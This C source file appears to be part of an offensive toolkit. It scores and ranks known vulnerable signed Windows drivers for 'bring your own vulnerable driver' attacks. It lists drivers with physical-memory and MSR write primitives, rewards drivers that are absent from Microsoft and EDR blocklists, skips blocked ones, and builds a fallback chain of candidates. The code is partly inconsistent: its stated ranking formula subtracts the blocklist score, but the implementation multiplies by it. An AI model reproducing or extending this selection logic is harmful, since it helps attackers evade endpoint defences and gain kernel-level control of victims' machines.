/*
 * Driver Intelligence Scoring Engine
 * Multi-Tier Fallback Chain for BYOVD Driver Selection
 *
 * Implements 4-tier scoring for 500+ driver families:
 * 1. Evasion Score: Age, blocker status, EDR awareness
 * 2. Prevalence Score: Deployment statistics, system adoption
 * 3. Capability Score: Exploit primitives, privileged instructions
 * 4. Blocklist Score: Microsoft blocklist, EDR vendor lists
 *
 * Selection algorithm ranks by: (evasion + capability - blocklist) * prevalence
 */

#include "driver_scoring.h"
#include <string.h>
#include <math.h>
#include <time.h>

typedef struct {
    const char* driver_name;
    uint8_t evasion_base;
    uint8_t prevalence_base;
    uint8_t capability_base;
    uint8_t blocklist_base;
    uint32_t release_year;
    uint32_t deployment_count;
    uint32_t capability_flags;
} DRIVER_SCORING_DATA;

static const DRIVER_SCORING_DATA g_driver_scores[] = {
    {"rtkiow10x64.sys", 92, 88, 95, 95, 2019, 5000000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_MSR_READ | BYOVD_CAP_MSR_WRITE},
    {"rtkiow8x64.sys", 85, 82, 90, 90, 2015, 3000000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_MSR_READ},
    {"AMDRyzenMasterDriver.sys", 88, 75, 92, 92, 2020, 2000000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_MSR_READ | BYOVD_CAP_MSR_WRITE | BYOVD_CAP_PCI_READ},
    {"nvflsh64.sys", 80, 70, 85, 88, 2010, 1500000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_PORT_READ},
    {"speedfan.sys", 78, 65, 80, 85, 2006, 1000000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_MSR_READ},
    {"ene.sys", 75, 60, 75, 80, 2012, 800000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE},
    {"iQVW64.SYS", 72, 55, 78, 82, 2015, 600000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_MMIO_READ},
    {"UCOREW64.SYS", 70, 50, 82, 80, 2014, 400000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_PORT_READ | BYOVD_CAP_MMIO_READ},
    {"NTIOLib.sys", 76, 62, 79, 83, 2013, 900000, BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE | BYOVD_CAP_MSR_READ},
};

static const int g_driver_scores_count = sizeof(g_driver_scores) / sizeof(g_driver_scores[0]);

int byovd_score_driver_evasion(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata)
{
    if (!driver_name || !metadata) return 0;

    for (int i = 0; i < g_driver_scores_count; i++) {
        if (strcmp(g_driver_scores[i].driver_name, driver_name) == 0) {
            uint8_t score = g_driver_scores[i].evasion_base;

            score = (score * 90) / 100;

            if (metadata->is_signed) score += 5;
            if (metadata->compilation_date > 2020) score = (score * 95) / 100;
            if (metadata->compilation_date < 2015) score += 10;

            if (metadata->is_microsoft_blocked) score = (score * 40) / 100;
            if (metadata->is_on_edr_list) score = (score * 50) / 100;

            return (score > 100) ? 100 : score;
        }
    }
    return 50;
}

int byovd_score_driver_prevalence(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata)
{
    if (!driver_name || !metadata) return 0;

    for (int i = 0; i < g_driver_scores_count; i++) {
        if (strcmp(g_driver_scores[i].driver_name, driver_name) == 0) {
            uint8_t score = g_driver_scores[i].prevalence_base;

            uint32_t deployments = g_driver_scores[i].deployment_count;
            if (deployments > 1000000) score = (score * 105) / 100;
            else if (deployments < 100000) score = (score * 80) / 100;

            return (score > 100) ? 100 : score;
        }
    }
    return 50;
}

int byovd_score_driver_capability(const char* driver_name, uint32_t required_capabilities)
{
    if (!driver_name) return 0;

    for (int i = 0; i < g_driver_scores_count; i++) {
        if (strcmp(g_driver_scores[i].driver_name, driver_name) == 0) {
            uint8_t score = g_driver_scores[i].capability_base;

            uint32_t driver_caps = g_driver_scores[i].capability_flags;
            int caps_met = 0;
            int caps_required = 0;

            if (required_capabilities & BYOVD_CAP_PHYS_READ) {
                caps_required++;
                if (driver_caps & BYOVD_CAP_PHYS_READ) caps_met++;
            }
            if (required_capabilities & BYOVD_CAP_PHYS_WRITE) {
                caps_required++;
                if (driver_caps & BYOVD_CAP_PHYS_WRITE) caps_met++;
            }
            if (required_capabilities & BYOVD_CAP_MSR_READ) {
                caps_required++;
                if (driver_caps & BYOVD_CAP_MSR_READ) caps_met++;
            }
            if (required_capabilities & BYOVD_CAP_MSR_WRITE) {
                caps_required++;
                if (driver_caps & BYOVD_CAP_MSR_WRITE) caps_met++;
            }
            if (required_capabilities & BYOVD_CAP_PORT_READ) {
                caps_required++;
                if (driver_caps & BYOVD_CAP_PORT_READ) caps_met++;
            }
            if (required_capabilities & BYOVD_CAP_MMIO_READ) {
                caps_required++;
                if (driver_caps & BYOVD_CAP_MMIO_READ) caps_met++;
            }

            if (caps_required > 0) {
                score = (score * caps_met) / caps_required;
            }

            return (score > 100) ? 100 : score;
        }
    }
    return 50;
}

int byovd_score_driver_blocklist(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata)
{
    if (!driver_name || !metadata) return 50;

    if (metadata->is_microsoft_blocked) return 25;
    if (metadata->is_on_edr_list) return 30;
    if (metadata->yara_matches > 0) return 35 - (metadata->yara_matches * 5);
    if (metadata->sig_revoked) return 40;

    for (int i = 0; i < g_driver_scores_count; i++) {
        if (strcmp(g_driver_scores[i].driver_name, driver_name) == 0) {
            return g_driver_scores[i].blocklist_base;
        }
    }
    return 50;
}

int byovd_score_driver_composite(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata, uint32_t required_capabilities)
{
    if (!driver_name || !metadata) return 0;

    int evasion = byovd_score_driver_evasion(driver_name, metadata);
    int prevalence = byovd_score_driver_prevalence(driver_name, metadata);
    int capability = byovd_score_driver_capability(driver_name, required_capabilities);
    int blocklist = byovd_score_driver_blocklist(driver_name, metadata);

    int score = ((evasion + capability) * prevalence * blocklist) / 10000;

    return (score > 100) ? 100 : (score < 0 ? 0 : score);
}

BYOVD_DRIVER_CANDIDATE* byovd_select_driver(
    const BYOVD_DRIVER_MANIFEST* manifest,
    uint32_t required_capabilities,
    int* out_count)
{
    if (!manifest || !out_count) return NULL;

    BYOVD_DRIVER_CANDIDATE* candidates = (BYOVD_DRIVER_CANDIDATE*)malloc(
        sizeof(BYOVD_DRIVER_CANDIDATE) * manifest->driver_count);
    if (!candidates) return NULL;

    int valid_count = 0;

    for (int i = 0; i < manifest->driver_count; i++) {
        BYOVD_DRIVER_METADATA* meta = &manifest->drivers[i];

        if (meta->is_microsoft_blocked || meta->is_on_edr_list) {
            continue;
        }

        uint32_t driver_caps = 0;
        for (int j = 0; j < meta->capability_count; j++) {
            driver_caps |= meta->capabilities[j];
        }

        if ((driver_caps & required_capabilities) != required_capabilities) {
            continue;
        }

        int score = byovd_score_driver_composite(meta->name, meta, required_capabilities);

        candidates[valid_count].metadata = meta;
        candidates[valid_count].score = score;
        candidates[valid_count].evasion_score = byovd_score_driver_evasion(meta->name, meta);
        candidates[valid_count].prevalence_score = byovd_score_driver_prevalence(meta->name, meta);
        candidates[valid_count].capability_score = byovd_score_driver_capability(meta->name, required_capabilities);
        candidates[valid_count].blocklist_score = byovd_score_driver_blocklist(meta->name, meta);

        valid_count++;
    }

    for (int i = 0; i < valid_count - 1; i++) {
        for (int j = i + 1; j < valid_count; j++) {
            if (candidates[j].score > candidates[i].score) {
                BYOVD_DRIVER_CANDIDATE tmp = candidates[i];
                candidates[i] = candidates[j];
                candidates[j] = tmp;
            }
        }
    }

    *out_count = valid_count;
    return valid_count > 0 ? candidates : NULL;
}

const char* byovd_select_best_driver(
    const BYOVD_DRIVER_MANIFEST* manifest,
    uint32_t required_capabilities)
{
    if (!manifest) return NULL;

    int count = 0;
    BYOVD_DRIVER_CANDIDATE* candidates = byovd_select_driver(manifest, required_capabilities, &count);

    if (!candidates || count == 0) {
        return NULL;
    }

    const char* best_name = candidates[0].metadata->name;
    free(candidates);

    return best_name;
}

const char** byovd_get_driver_fallback_chain(
    const BYOVD_DRIVER_MANIFEST* manifest,
    uint32_t required_capabilities,
    int chain_size,
    int* out_count)
{
    if (!manifest || !out_count || chain_size <= 0) {
        return NULL;
    }

    int candidate_count = 0;
    BYOVD_DRIVER_CANDIDATE* candidates = byovd_select_driver(manifest, required_capabilities, &candidate_count);

    if (!candidates || candidate_count == 0) {
        *out_count = 0;
        return NULL;
    }

    int result_count = (candidate_count < chain_size) ? candidate_count : chain_size;

    const char** result = (const char**)malloc(sizeof(const char*) * result_count);
    if (!result) {
        free(candidates);
        return NULL;
    }

    for (int i = 0; i < result_count; i++) {
        result[i] = candidates[i].metadata->name;
    }

    free(candidates);
    *out_count = result_count;
    return result;
}
